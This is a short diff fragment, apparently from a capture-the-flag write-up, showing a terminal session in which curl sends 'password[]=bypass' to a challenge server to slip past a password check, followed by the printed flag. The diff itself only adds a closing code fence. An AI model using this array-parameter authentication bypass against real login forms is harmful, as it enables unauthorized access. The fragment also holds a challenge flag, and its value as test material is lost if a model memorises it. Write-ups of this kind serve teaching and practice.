@@ -37,7 +37,7 @@ It was merely cakewalk for us thereafter. See if you can find the flag.
 root@Python:/home/venom/Downloads# curl --data "password[]=bypass" http://hack.bckdr.in:16014/
 You have successfully authenticated!<br>Flag : b0a524a10572548e34b025471a023b4aea220f7b202f422f7b5d5c68592c8faa
 root@Python:/home/venom/Downloads# 
-
+```
 
 </b><h3>Flag</h3></b>
 <pre>
